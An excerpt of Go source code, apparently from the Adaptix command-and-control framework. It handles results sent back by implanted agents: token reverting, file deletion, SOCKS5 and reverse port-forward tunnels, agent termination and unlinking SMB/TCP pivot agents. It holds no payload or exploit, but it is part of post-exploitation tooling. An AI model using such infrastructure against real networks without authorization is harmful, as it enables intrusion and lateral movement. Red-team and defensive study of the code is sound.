		case COMMAND_REV2SELF:
			task.Message = "Token reverted successfully"
			emptyImpersonate := ""
			_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
				Impersonated *string `json:"impersonated"`
			}{Impersonated: &emptyImpersonate})

		case COMMAND_RM:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()
			if result == 0 {
				task.Message = "File deleted successfully"
			} else {
				task.Message = "Directory deleted successfully"
			}

		case COMMAND_TUNNEL_START_TCP:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}

			channelId := int(TaskId)
			_ = packer.ParseInt32()
			result := packer.ParseInt32()
			if result == 0 {
				Ts.TsTunnelConnectionResume(agentData.Id, channelId, false)
			} else if result == 1 {
				Ts.TsTunnelConnectionClose(channelId, true)
			} else {
				errorCode := adaptix.SOCKS5_HOST_UNREACHABLE
				if result == 10061 { // WSAECONNREFUSED
					errorCode = adaptix.SOCKS5_CONNECTION_REFUSED
				}
				Ts.TsTunnelConnectionHalt(channelId, errorCode)
			}

		case COMMAND_TUNNEL_WRITE_TCP:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}

			channelId := int(TaskId)
			data := packer.ParseBytes()
			Ts.TsTunnelConnectionData(channelId, data)

		case COMMAND_TUNNEL_REVERSE:
			if false == packer.CheckPacker([]string{"int", "int"}) {
				goto HANDLER
			}
			var err error
			tunnelId := int(TaskId)
			_ = packer.ParseInt32()
			result := packer.ParseInt32()
			if result == 0 {
				task.TaskId, task.Message, err = Ts.TsTunnelUpdateRportfwd(tunnelId, false)
			} else {
				task.TaskId, task.Message, err = Ts.TsTunnelUpdateRportfwd(tunnelId, true)
			}

			if err != nil {
				task.MessageType = adaptix.MESSAGE_ERROR
			} else {
				task.MessageType = adaptix.MESSAGE_SUCCESS
			}

		case COMMAND_TUNNEL_ACCEPT:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			tunnelId := int(TaskId)
			channelId := int(packer.ParseInt32())
			Ts.TsTunnelConnectionAccept(tunnelId, channelId)

		case COMMAND_TUNNEL_PAUSE:
			channelId := int(TaskId)
			Ts.TsTunnelPause(channelId)

		case COMMAND_TUNNEL_RESUME:
			channelId := int(TaskId)
			Ts.TsTunnelResume(channelId)

		case COMMAND_TUNNEL_CLOSE:
			if false == packer.CheckPacker([]string{"int", "int"}) {
				goto HANDLER
			}
			_ = packer.ParseInt32()
			_ = packer.ParseInt32()
			channelId := int(TaskId)
			Ts.TsTunnelConnectionClose(channelId, false)

		case COMMAND_TERMINATE:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			exitMethod := packer.ParseInt32()
			if exitMethod == 1 {
				task.Message = "The agent has completed its work (kill thread)"
			} else if exitMethod == 2 {
				task.Message = "The agent has completed its work (kill process)"
			}

			_ = Ts.TsAgentTerminate(agentData.Id, task.TaskId)

		case COMMAND_UNLINK:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				goto HANDLER
			}

			pivotId := fmt.Sprintf("%08x", packer.ParseInt32())
			pivotType := packer.ParseInt8()

			messageParent := ""
			messageChild := ""
			_, parentAgentId, childAgentId := Ts.TsGetPivotInfoById(pivotId)

			if pivotType == 1 {
				messageParent = fmt.Sprintf("SMB agent disconnected %s", childAgentId)
				messageChild = fmt.Sprintf(" ----- SMB agent disconnected from [%s] ----- ", parentAgentId)
			} else if pivotType == 2 {
				messageParent = fmt.Sprintf("TCP agent %s connection reset", childAgentId)
				messageChild = fmt.Sprintf(" ----- TCP agent connection reset ----- ")
			} else if pivotType == 10 {
				messageParent = fmt.Sprintf("Pivot agent %s connection reset", childAgentId)
				messageChild = fmt.Sprintf(" ----- Pivot agent connection reset ----- ")
			}

			if pivotType != 0 {
				_ = Ts.TsPivotDelete(pivotId)
				if TaskId == 0 {
					Ts.TsAgentConsoleOutput(parentAgentId, adaptix.MESSAGE_SUCCESS, messageParent, "\n", true)
				} else {
					task.Message = messageParent
				}
				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, messageChild, "\n", true)
			}

		case COMMAND_UPLOAD:
			task.Message = "File successfully uploaded"
			Ts.TsClientGuiFilesStatus(task)

		case COMMAND_ERROR:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			errorCode := packer.ParseInt32()
			task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
			task.MessageType = adaptix.MESSAGE_ERROR

		default:
			continue
		}

		outTasks = append(outTasks, task)
	}

HANDLER:

	/// END CODE

	for _, task := range outTasks {
		Ts.TsTaskUpdate(agentData.Id, task)
	}

	return nil
}
